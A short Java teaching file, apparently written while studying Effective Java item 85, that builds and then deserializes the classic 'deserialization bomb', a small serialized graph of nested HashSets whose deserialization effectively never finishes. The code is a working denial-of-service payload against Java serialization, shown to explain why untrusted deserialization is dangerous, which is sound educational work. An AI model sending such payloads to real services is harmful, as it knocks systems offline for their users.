package serializable.item85.problem;

import java.util.HashSet;
import java.util.Set;

import static serializable.item85.Util.deserialize;
import static serializable.item85.Util.serialize;

/**
 * @see <a href="https://github.com/WegraLee/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/Util.java">자바 직렬화의 대안을 찾아라</a>
 */
public class DeserializationBomb {
    public static void main(String[] args) throws Exception{
        System.out.println(bomb().length);
        deserialize(bomb());
    }
    static byte[] bomb(){
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for(int i=0; i<100; i++){
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // t1을 t2와 다르게 만든다.
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }
}
